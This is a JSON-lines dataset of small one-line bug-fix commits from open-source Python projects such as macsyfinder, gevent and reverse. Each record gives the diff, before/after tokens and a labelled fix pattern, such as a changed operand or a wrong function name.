\\\\\\\"0x%x:\\\\?\\\\\\\"\\\\n\\\"\"]]"}
{"project": "QSTK", "commit_sha": "c050a6618465bbbcf00ea26bc57231d52f96a2c7", "parent_sha": "dd1e1ee30e8f1ab148c8f64017fe91857067aab6", "file_path": "trunk/qstkutil/pseries.py", "project_url": "https://github.com/tucker777/QSTK", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ def getDataMatrixFromData(dataname,partname,symbols,tsstart,tsend):\n \t\tpaths.append(pathpre + pathsub + \"/US_NYSE Arca/\")\r\n \t\tpaths.append(pathpre + pathsub + \"/OTC/\")\r\n \t\tpaths.append(pathpre + pathsub + \"/US_AMEX/\")\r\n-\t\tpaths.append(pathpre + pathsub + \"/US_Delisted_US_Recent/\")\r\n+\t\tpaths.append(pathpre + pathsub + \"/Delisted_US_Recent/\")\r\n \t\tpaths.append(pathpre + pathsub + \"/US_Delisted/\")\r\n \t\tdatastr1 = \"/StrategyData\"\r\n \t\tdatastr2 = \"StrategyData\"\r\n", "before": "paths . append ( pathpre + pathsub + \"/US_Delisted_US_Recent/\" )", "after": "paths . append ( pathpre + pathsub + \"/Delisted_US_Recent/\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"/US_Delisted_US_Recent/\\\"\", 3, 36, 3, 61], \"\\\"/Delisted_US_Recent/\\\"\"]]"}
{"project": "sublime_terminal", "commit_sha": "9dd108098a686390824d59970ff7218d526d555f", "parent_sha": "c9595e8abba4c16561d4a81c5eab738bfb376757", "file_path": "Terminal.py", "project_url": "https://github.com/wbond/sublime_terminal", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,7 +96,7 @@ class TerminalSelector():\n                 'xfce4-session|lxsession|mate-panel|cinnamon-sessio\" | grep -v grep'\n             wm = [x.replace(\"\\n\", '') for x in os.popen(ps)]\n             if wm:\n-                if wm[0] == 'gnome-session' or wm[0] == 'cinnamon-sessio':\n+                if 'gnome-session' in wm[0] or wm[0] == 'cinnamon-sessio':\n                     default = 'gnome-terminal'\n                 elif wm[0] == 'xfce4-session':\n                     default = 'xfce4-terminal'\n", "before": "if wm [ 0 ] == 'gnome-session' or wm [ 0 ] == 'cinnamon-sessio' : default = 'gnome-terminal' elif wm [ 0 ] == 'xfce4-session' : default = 'xfce4-terminal'", "after": "if 'gnome-session' in wm [ 0 ] or wm [ 0 ] == 'cinnamon-sessio' : default = 'gnome-terminal' elif wm [ 0 ] == 'xfce4-session' : default = 'xfce4-terminal'", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 20, 3, 44], [\"string:'gnome-session'\", \"T\"], 0], [\"Insert\", [\"comparison_operator\", 3, 20, 3, 44], [\"in:in\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 26, 3, 28]], [\"Delete\", [\"string:'gnome-session'\", 3, 29, 3, 44]]]"}
{"project": "spatious", "commit_sha": "249e1f5630b8e89a5e288e36be5119f244a152eb", "parent_sha": "e1e087bef49d6507e7bb3cf25cd72cde502bffeb", "file_path": "spatious/geom.py", "project_url": "https://github.com/eddiejessup/spatious", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -217,7 +217,7 @@ def spherocylinder_radius_for_aspect(V, ar):\n-    return (V / (2.0 * np.pi * (a - (1.0 / 3.0)))) ** (1.0 / 3.0)\n+    return (V / (2.0 * np.pi * (ar - (1.0 / 3.0)))) ** (1.0 / 3.0)\n \n \n def spheres_sep(ar, aR, br, bR):\n", "before": "return ( V / ( 2.0 * np . pi * ( a - ( 1.0 / 3.0 ) ) ) ) ** ( 1.0 / 3.0 )", "after": "return ( V / ( 2.0 * np . pi * ( ar - ( 1.0 / 3.0 ) ) ) ) ** ( 1.0 / 3.0 )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:a\", 0, 33, 0, 34], \"ar\"]]"}
{"project": "pero", "commit_sha": "db949cda18a2dc7470e340c87d9dc6201d2a86eb", "parent_sha": "7aacb5366c5a489494ac1b8c5554af844316cfb8", "file_path": "pero/backends/export.py", "project_url": "https://github.com/xxao/pero", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def export(graphics, path, width=None, height=None, **options):\n     \n     # unsupported format\n     if backend is None:\n-        message = \"Unsupported image format or missing library! -> %s\" % extension\n+        message = \"Unsupported image format or missing library (e.g. wxPython or PyCairo)! -> %s\" % extension\n         raise ImportError(message)\n     \n     # export image\n", "before": "message = \"Unsupported image format or missing library! -> %s\" % extension", "after": "message = \"Unsupported image format or missing library (e.g. wxPython or PyCairo)! -> %s\" % extension", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Unsupported image format or missing library! -> %s\\\"\", 3, 19, 3, 71], \"\\\"Unsupported image format or missing library (e.g. wxPython or PyCairo)! -> %s\\\"\"]]"}
{"project": "reverse", "commit_sha": "b1b73b174156e3fbe86f6c530426de2467e8aaad", "parent_sha": "2e788918c55b1c4a99951e432b17a74bfe52d62a", "file_path": "lib/arch/arm/output.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class Output(OutputAbs):\n                     # print_no_end(color_var(self.get_var_name(i, num_op)))\n                     # return True\n                 if mm.base == ARM_REG_PC:\n-                    addr = i.address + i.size + mm.disp\n+                    addr = i.address + i.size * 2 + mm.disp\n                     print_no_end(\"*(\")\n                     if mm.disp in self.binary.reverse_symbols:\n                         self.print_symbol(addr)\n", "before": "addr = i . address + i . size + mm . disp", "after": "addr = i . address + i . size * 2 + mm . disp", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 28, 3, 46], [\"binary_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"attribute\", 3, 40, 3, 46], 0], [\"Insert\", \"N0\", [\"*:*\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:2\", \"T\"], 2]]"}
{"project": "reverse", "commit_sha": "bc85e475e8327a669bd831117ec34572ed66a897", "parent_sha": "74461639697e05dcd5f7ea9ecdfda130d994223c", "file_path": "lib/visual.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -111,7 +111,7 @@ class Visual():\n         self.interact.ctx.quiet = saved_quiet\n \n         if self.stack:\n-            print(\"last address seen 0x%x\" % self.stack[-1][0])\n+            print(\"last address seen 0x%x\" % self.interact.ctx.entry_addr)\n \n \n     def read_escape_keys(self):\n", "before": "print ( \"last address seen 0x%x\" % self . stack [ - 1 ] [ 0 ] )", "after": "print ( \"last address seen 0x%x\" % self . interact . ctx . entry_addr )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 19, 3, 63], [\"attribute\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:entry_addr\", \"T\"], 2], [\"Move\", \"N1\", [\"attribute\", 3, 46, 3, 56], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:ctx\", \"T\"], 2], [\"Update\", [\"identifier:stack\", 3, 51, 3, 56], \"interact\"], [\"Delete\", [\"[:[\", 3, 56, 3, 57]], [\"Delete\", [\"-:-\", 3, 57, 3, 58]], [\"Delete\", [\"integer:1\", 3, 58, 3, 59]], [\"Delete\", [\"unary_operator\", 3, 57, 3, 59]], [\"Delete\", [\"]:]\", 3, 59, 3, 60]], [\"Delete\", [\"subscript\", 3, 46, 3, 60]], [\"Delete\", [\"[:[\", 3, 60, 3, 61]], [\"Delete\", [\"integer:0\", 3, 61, 3, 62]], [\"Delete\", [\"]:]\", 3, 62, 3, 63]], [\"Delete\", [\"subscript\", 3, 46, 3, 63]]]"}
{"project": "reverse", "commit_sha": "b09b922fb4ca0c40b6d8f689fa1d9acefffc314a", "parent_sha": "28ccdda0b1159976ebd3f15e89b91bc6d6cdf469", "file_path": "reverse/lib/analyzer.py", "project_url": "https://github.com/d4nnyk/reverse", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -467,7 +467,7 @@ class Analyzer(threading.Thread):\n \n         if not force:\n             if not entry_is_func and self.dis.mem.is_loc(entry) or \\\n-                    entry_is_func and self.dis.mem.is_func(entry):\n+                    entry_is_func and entry in self.functions:\n                 return\n \n         self.pending.add(entry)\n", "before": "if not entry_is_func and self . dis . mem . is_loc ( entry ) or entry_is_func and self . dis . mem . is_func ( entry ) : return", "after": "if not entry_is_func and self . dis . mem . is_loc ( entry ) or entry_is_func and entry in self . functions : return", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 21, 3, 66], [\"comparison_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:entry\", 3, 60, 3, 65], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 39, 3, 47], 2], [\"Move\", [\"attribute\", 3, 39, 3, 47], [\".:.\", 3, 51, 3, 52], 1], [\"Update\", [\"identifier:dis\", 3, 44, 3, 47], \"functions\"], [\"Delete\", [\".:.\", 3, 43, 3, 44]], [\"Delete\", [\".:.\", 3, 47, 3, 48]], [\"Delete\", [\"identifier:mem\", 3, 48, 3, 51]], [\"Delete\", [\"attribute\", 3, 39, 3, 51]], [\"Delete\", [\"identifier:is_func\", 3, 52, 3, 59]], [\"Delete\", [\"attribute\", 3, 39, 3, 59]], [\"Delete\", [\"(:(\", 3, 59, 3, 60]], [\"Delete\", [\"):)\", 3, 65, 3, 66]], [\"Delete\", [\"argument_list\", 3, 59, 3, 66]], [\"Delete\", [\"call\", 3, 39, 3, 66]]]"}
{"project": "security_monkey", "commit_sha": "fbbda20498696791b48a7af55a12990bc5bc88e2", "parent_sha": "5cbecbaaa609a9cf49b1dee42881ca91a07f368b", "file_path": "security_monkey/auditors/security_group.py", "project_url": "https://github.com/Gnostech/security_monkey", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -60,7 +60,7 @@ class SecurityGroupAuditor(Auditor):\n         severity = 3\n         for rule in sg_item.config.get(\"rules\", []):\n             cidr = rule.get(\"cidr_ip\", None)\n-            if cidr and not cidr in self.network_whitelist:\n+            if cidr and cidr not in self.network_whitelist:\n                 if '/' in cidr and not cidr == \"0.0.0.0/0\" and not cidr == \"10.0.0.0/8\":\n                     mask = int(cidr.split('/')[1])\n                     if mask < 24 and mask > 0:\n", "before": "if cidr and not cidr in self . network_whitelist : if '/' in cidr and not cidr == \"0.0.0.0/0\" and not cidr == \"10.0.0.0/8\" : mask = int ( cidr . split ( '/' ) [ 1 ] ) if mask < 24 and mask > 0 : ", "after": "if cidr and cidr not in self . network_whitelist : if '/' in cidr and not cidr == \"0.0.0.0/0\" and not cidr == \"10.0.0.0/8\" : mask = int ( cidr . split ( '/' ) [ 1 ] ) if mask < 24 and mask > 0 : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 16, 3, 59], [\"comparison_operator\", 3, 29, 3, 59], 2], [\"Insert\", [\"comparison_operator\", 3, 29, 3, 59], [\"not:not\", \"T\"], 1], [\"Delete\", [\"not:not\", 3, 25, 3, 28]], [\"Delete\", [\"not_operator\", 3, 25, 3, 59]]]"}
{"project": "adba", "commit_sha": "47d8d4a0a27747a486d01eeaee3b543e7eeb1b78", "parent_sha": "f55e5785b24263f29c3233a0b404c7643f3da807", "file_path": "adba/aniDBAbstracter.py", "project_url": "https://github.com/pymedusa/adba", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -220,7 +220,7 @@ class Anime(aniDBabstractObject):\n \n class Episode(aniDBabstractObject):\n     def __init__(self, aniDB, number=None, epid=None, filePath=None, fid=None, epno=None, paramsA=None, paramsF=None, load=False, calculate=False):\n-        if not aniDB and not number and not epid and not file and not fid:\n+        if not aniDB and not number and not epid and not filePath and not fid:\n             return None\n \n         self.maper = AniDBMaper()\n", "before": "if not aniDB and not number and not epid and not file and not fid : return None", "after": "if not aniDB and not number and not epid and not filePath and not fid : return None", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:file\", 3, 58, 3, 62], \"filePath\"]]"}
{"project": "bart", "commit_sha": "4a04884c17ded313a62bdcdfe21aa04926be2099", "parent_sha": "7cf0179d31ecb0b6929431a36dedc7aff81b6860", "file_path": "setup.py", "project_url": "https://github.com/hpc2n/bart", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ class InstallDataBart(install_data):\n \n         # check that we don't overwrite /etc files\n         for (prefix, files) in reversed(self.data_files):\n-            if prefix.startswith(os.path.join(RELOCATE or '', 'etc')):\n+            if prefix.startswith(os.path.join(RELOCATE or '/', 'etc')):\n                 for basefile in files:\n                     fn = os.path.join(prefix, os.path.basename(basefile))\n                     if os.path.exists(fn):\n", "before": "if prefix . startswith ( os . path . join ( RELOCATE or '' , 'etc' ) ) : for basefile in files : fn = os . path . join ( prefix , os . path . basename ( basefile ) ) if os . path . exists ( fn ) : ", "after": "if prefix . startswith ( os . path . join ( RELOCATE or '/' , 'etc' ) ) : for basefile in files : fn = os . path . join ( prefix , os . path . basename ( basefile ) ) if os . path . exists ( fn ) : ", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:''\", 3, 59, 3, 61], \"'/'\"]]"}
{"project": "gevent", "commit_sha": "6e64e5fad19484e64ebd07d039f05e91b3a2a0e6", "parent_sha": "a298830d36fdaae2305a1c2608b59dff763a1b04", "file_path": "gevent/threadpool.py", "project_url": "https://github.com/gevent/gevent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class ThreadPool(object):\n         if not isinstance(maxsize, integer_types):\n             raise TypeError('maxsize must be integer: %r' % (maxsize, ))\n         if maxsize < 0:\n-            raise ValueError('maxsize cannot be negative: %r' % (maxsize, ))\n+            raise ValueError('maxsize must not be negative: %r' % (maxsize, ))\n         difference = maxsize - self._maxsize\n         self._semaphore.counter += difference\n         self._maxsize = maxsize\n", "before": "raise ValueError ( 'maxsize cannot be negative: %r' % ( maxsize , ) )", "after": "raise ValueError ( 'maxsize must not be negative: %r' % ( maxsize , ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'maxsize cannot be negative: %r'\", 3, 30, 3, 62], \"'maxsize must not be negative: %r'\"]]"}
{"project": "amepah", "commit_sha": "c0e05b79d6eaf55c748253080e940af5b19423b3", "parent_sha": "0ee205932c8c25c134c0003eff709e257f4de731", "file_path": "calibrate_zodi_time.py", "project_url": "https://github.com/berkelem/amepah", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class Coadder:\n             cal_uncs = orbit_uncs_masked / abs(gain)\n             zodi_data = self.load_zodi_orbit(orbit_num, pixel_inds)\n             zodi_data_masked = np.array([zodi_data[i] for i in range(len(zodi_data)) if i not in entries_to_mask])\n-            zs_data = cal_data - zodi_data\n+            zs_data = cal_data - zodi_data_masked\n \n \n             # if orbit_num % 100 == 0:\n", "before": "zs_data = cal_data - zodi_data", "after": "zs_data = cal_data - zodi_data_masked", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:zodi_data\", 3, 34, 3, 43], \"zodi_data_masked\"]]"}
{"project": "burp_server_reports", "commit_sha": "b76e91c4517e52528f8543fce276ff4b5af9a4f6", "parent_sha": "3b62670c45cd2ccc5a3f34bc0ede913a1627fae9", "file_path": "burp_reports/lib/files.py", "project_url": "https://github.com/pablodav/burp_server_reports", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -7,7 +7,7 @@ def temp_file(file='temporal'):\n     # Append uid to end of filename\n-    file += '_{}'.format(os.getuid())\n+    file += '_{}'.format(os.getlogin())\n     # Simplified and reutilized core funtionally from python\n     cache_path = os.path.join(tempfile.gettempdir(), file)\n \n", "before": "file += '_{}' . format ( os . getuid ( ) )", "after": "file += '_{}' . format ( os . getlogin ( ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:getuid\", 1, 29, 1, 35], \"getlogin\"]]"}
{"project": "edx-platform", "commit_sha": "621acd20e3be011b3859a58f1e2c4b310e489a4a", "parent_sha": "a19319f7fbbef9fdd4c4eb8a17746925b2f4e9df", "file_path": "lms/djangoapps/courseware/tabs.py", "project_url": "https://github.com/easy-edx/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,6 +269,6 @@ def get_static_tab_contents(course, tab):\n                     contents = replace_urls(tabfile.read(), course.metadata['data_dir'])\n                     return replace_urls(contents, staticfiles_prefix='/courses/'+course.id, replace_prefix='/course/')\n             except (ResourceNotFoundError) as err:\n-                log.warning(\"Couldn't load tab contents from '{0}': {1}\".format(p, err))\n+                log.exception(\"Couldn't load tab contents from '{0}': {1}\".format(p, err))\n                 return None\n     return None\n", "before": "err : log . warning ( \"Couldn't load tab contents from '{0}': {1}\" . format ( p , err ) )", "after": "err : log . exception ( \"Couldn't load tab contents from '{0}': {1}\" . format ( p , err ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:warning\", 3, 21, 3, 28], \"exception\"]]"}
{"project": "macsyfinder", "commit_sha": "40032e8009e43e9d2a283b9e127cb56ade10187f", "parent_sha": "5c2a76512cfa60594b024ba7dadc118c96476078", "file_path": "setup.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -163,7 +163,7 @@ def subst_vars(src, dst, vars):\n                     new_line = distutils_subst_vars(line, vars)\n                     dest_file.write(new_line)\n             except UnicodeDecodeError as err:\n-                raise UnicodeDecodeError(f\"{src}: {err}\")\n+                raise RuntimeError(f\"{src}: {err}\")\n \n \n def expand_data(data_to_expand):\n", "before": "UnicodeDecodeError as err : raise UnicodeDecodeError ( f\"{src}: {err}\" )", "after": "UnicodeDecodeError as err : raise RuntimeError ( f\"{src}: {err}\" )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:UnicodeDecodeError\", 3, 23, 3, 41], \"RuntimeError\"]]"}
{"project": "macsyfinder", "commit_sha": "329ae42f21001d9922497959b0e9011fe64ab892", "parent_sha": "456f4e891cc929ff354341aa820ff1c6ab90ebda", "file_path": "tests/test_macsydata.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -310,7 +310,7 @@ copyright: 2019, Institut Pasteur, CNRS\"\"\"\n         self.args.package = pack_name\n         with self.catch_log(log_name='macsydata') as log:\n             with self.assertRaises(ValueError):\n-                macsydata.do_info(self.args)\n+                macsydata.do_cite(self.args)\n             log_msg = log.get_value()\n         self.assertEqual(log_msg.strip(), f\"Models '{pack_name}' not found locally.\")\n \n", "before": "macsydata . do_info ( self . args )", "after": "macsydata . do_cite ( self . args )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:do_info\", 3, 27, 3, 34], \"do_cite\"]]"}
{"project": "macsyfinder", "commit_sha": "73105c385f5218ae357b4f238cd9a52a44ce9d8c", "parent_sha": "77897212c061c8f90b73c629b586fcea95cbc62c", "file_path": "macsypy/definition_parser.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -272,7 +272,7 @@ class DefinitionParser:\n             new_gene = ModelGene(self.gene_bank[(model.family_name, name)], model, **attrs)\n \n             for exchangeable_node in gene_node.findall(\"exchangeables/gene\"):\n-                new_gene.add_homolog(self._parse_exchangeable(exchangeable_node, new_gene, model))\n+                new_gene.add_exchangeable(self._parse_exchangeable(exchangeable_node, new_gene, model))\n \n             presence = gene_node.get(\"presence\")\n             if not presence:\n", "before": "new_gene . add_homolog ( self . _parse_exchangeable ( exchangeable_node , new_gene , model ) )", "after": "new_gene . add_exchangeable ( self . _parse_exchangeable ( exchangeable_node , new_gene , model ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:add_homolog\", 3, 26, 3, 37], \"add_exchangeable\"]]"}
{"project": "macsyfinder", "commit_sha": "f96832b74c6f21b1bceaabf4da0422d84be2d7dc", "parent_sha": "03ddb99007d6d4dc9038e918246eb4494e1a1fdf", "file_path": "tests/test_macsyfinder.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ from tests import MacsyTest\n class Test(MacsyTest):\n \n     def setUp(self):\n-        self.tmp_dir = tempfile.gettempdir()\n+        self.tmp_dir = tempfile.mkdtemp()\n \n \n     def tearDown(self):\n", "before": "self . tmp_dir = tempfile . gettempdir ( )", "after": "self . tmp_dir = tempfile . mkdtemp ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:gettempdir\", 3, 33, 3, 43], \"mkdtemp\"]]"}
{"project": "macsyfinder", "commit_sha": "0aad436df49f1ceaa1d9e56d1751c5e7348bfbc1", "parent_sha": "09a4228ee14be9522550a4d9c77017ac6197fa22", "file_path": "macsypy/gene.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -563,7 +563,7 @@ class Profile(object):\n                            \"sequence_db\": self.cfg.sequence_db(),\n                            }\n                 command = \"{hmmer_exe} --cpu 0 -o {output_file} -E {e_value_res:f} {profile} {sequence_db} \".format(**options)\n-                _log.info(\"{0} Hmmer command line : {1}\".format(self.gene.name, command))\n+                _log.debug(\"{0} Hmmer command line : {1}\".format(self.gene.name, command))\n                 try:\n                     hmmer = Popen(command,\n                                   shell=True,\n", "before": "_log . info ( \"{0} Hmmer command line : {1}\" . format ( self . gene . name , command ) )", "after": "_log . debug ( \"{0} Hmmer command line : {1}\" . format ( self . gene . name , command ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 22, 3, 26], \"debug\"]]"}
{"project": "macsyfinder", "commit_sha": "8321c536468d478a4379acef0cd676486da4d0e4", "parent_sha": "ba9d8b704c3f9b02243c54ab56e024b03f03f1ea", "file_path": "macsypy/package.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -196,7 +196,7 @@ class Package:\n         with open(self.metadata) as raw_metadata:\n-            metadata = yaml.full_load(raw_metadata)\n+            metadata = yaml.safe_load(raw_metadata)\n         return metadata\n \n \n", "before": "metadata = yaml . full_load ( raw_metadata )", "after": "metadata = yaml . safe_load ( raw_metadata )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:full_load\", 1, 29, 1, 38], \"safe_load\"]]"}
{"project": "pacerrssscraper", "commit_sha": "4c43da4c0b44fe5e14c4d6a7708c568130bc5a07", "parent_sha": "338f9f2fdb97604a2b8c23ccee1ef5fe613bc77a", "file_path": "rss_scrape.py", "project_url": "https://github.com/calvinli/pacerrssscraper", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def send_email(entry, email_account, email_pass, email_to):\n     s.starttls()\n     s.login(email_account, email_pass)\n \n-    info = parse(entry)\n+    info = parse_entry(entry)\n \n", "before": "info = parse ( entry )", "after": "info = parse_entry ( entry )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:parse\", 3, 12, 3, 17], \"parse_entry\"]]"}
{"project": "osf-sync", "commit_sha": "bd2603c9da15bb23ac8cd7cfd80992ed30b0dcb2", "parent_sha": "97b7a0f636ba9bcb256b08d83b913d4775c304bd", "file_path": "osfoffline/gui/qt/generated/preferences.py", "project_url": "https://github.com/CenterForOpenScience/osf-sync", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class Ui_Settings(object):\n         self.changeFolderButton = QtWidgets.QPushButton(self.groupBox_6)\n         self.changeFolderButton.setGeometry(QtCore.QRect(440, 20, 99, 31))\n         self.changeFolderButton.setObjectName(\"changeFolderButton\")\n-        self.containingFolderTextEdit = QtWidgets.Qlabel(self.groupBox_6)\n+        self.containingFolderTextEdit = QtWidgets.QLabel(self.groupBox_6)\n         self.containingFolderTextEdit.setGeometry(QtCore.QRect(20, 20, 331, 31))\n         self.containingFolderTextEdit.setObjectName(\"containingFolderTextEdit\")\n         self.gridLayout_7.addWidget(self.groupBox_6, 1, 0, 1, 1)\n", "before": "self . containingFolderTextEdit = QtWidgets . Qlabel ( self . groupBox_6 )", "after": "self . containingFolderTextEdit = QtWidgets . QLabel ( self . groupBox_6 )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:Qlabel\", 3, 51, 3, 57], \"QLabel\"]]"}
{"project": "weblyzard_api", "commit_sha": "f42672bf297646e52ba19d16f09c6e8a7ce12d11", "parent_sha": "4c5ec4a2bb1286795f0e8cd53ada37e513c0b19f", "file_path": "src/python/weblyzard_api/model/__init__.py", "project_url": "https://github.com/weblyzard/weblyzard_api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -286,7 +286,7 @@ class Sentence(object):\n                 ), exc_info=True)\n                 token_indices = map(int, token_pos.split())\n                 start, end = token_indices[0], token_indices[-1]\n-            res = unicode(self.sentence)[start:end]\n+            res = str(self.sentence)[start:end]\n             # de- and encoding sometimes leads to index errors with double-width\n             # characters - here we attempt to detect such cases and correct\n             if res.strip() != res:\n", "before": "res = unicode ( self . sentence ) [ start : end ]", "after": "res = str ( self . sentence ) [ start : end ]", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:unicode\", 3, 19, 3, 26], \"str\"]]"}
{"project": "macsyfinder", "commit_sha": "39d3b977a71f21860168a15d0794d31fd92005d2", "parent_sha": "b6806ee8244c46e4c46d1ab30ab4245d30f9929b", "file_path": "macsypy/definition_parser.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -157,7 +157,7 @@ class DefinitionParser:\n \n         gene_allowed_attributes = {'name', 'presence', 'loner', 'multi_system', 'inter_gene_max_space'}\n         gene_all_attributes = set()\n-        for gene in model_node.getiterator('gene'):\n+        for gene in model_node.iter('gene'):\n             gene_all_attributes |= set(gene.attrib.keys())\n         gene_unallowed_attribute = gene_all_attributes - gene_allowed_attributes\n         if gene_unallowed_attribute:\n", "before": "for gene in model_node . getiterator ( 'gene' ) : gene_all_attributes |= set ( gene . attrib . keys ( ) )", "after": "for gene in model_node . iter ( 'gene' ) : gene_all_attributes |= set ( gene . attrib . keys ( ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:getiterator\", 3, 32, 3, 43], \"iter\"]]"}
{"project": "sipa", "commit_sha": "e34db3f154c2aa1f5e2966c427b9b75133c08d0f", "parent_sha": "486aa6436848844d0af222d1bf7c578bef2503d4", "file_path": "sipa/initialization.py", "project_url": "https://github.com/agdsn/sipa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,8 +161,8 @@ def init_logging(app):\n         if os.path.isfile(location_log_config):\n             logging.config.fileConfig(location_log_config,\n                                       disable_existing_loggers=True)\n-            logger.info('Extra log config loaded: \"%s\"',\n-                        location_log_config)\n+            logger.debug('Extra log config loaded: \"%s\"',\n+                         location_log_config)\n         else:\n             logger.warning('Error loading extra log config \"%s\"',\n                            location_log_config)\n", "before": "logger . info ( 'Extra log config loaded: \"%s\"' , location_log_config )", "after": "logger . debug ( 'Extra log config loaded: \"%s\"' , location_log_config )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 20, 3, 24], \"debug\"]]"}
{"project": "pluginmanager", "commit_sha": "71ef7194125abfdfcda6195e4ad1b4fc3b13e7c4", "parent_sha": "91001efbd65c164dcfc0d23fa6f693f985b9640d", "file_path": "simpleyapsy/file_locator.py", "project_url": "https://github.com/benhoff/pluginmanager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -63,7 +63,7 @@ class FileLocator(object):\n             for dir_path in dir_paths:\n                 # Can have more than one file getter\n                 filepaths = self._file_getter_iterator_helper(dir_path)\n-                self.plugin_files.update(filepaths)\n+                self.plugin_files.add(filepaths)\n \n         return self.plugin_files\n \n", "before": "self . plugin_files . update ( filepaths )", "after": "self . plugin_files . add ( filepaths )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:update\", 3, 35, 3, 41], \"add\"]]"}
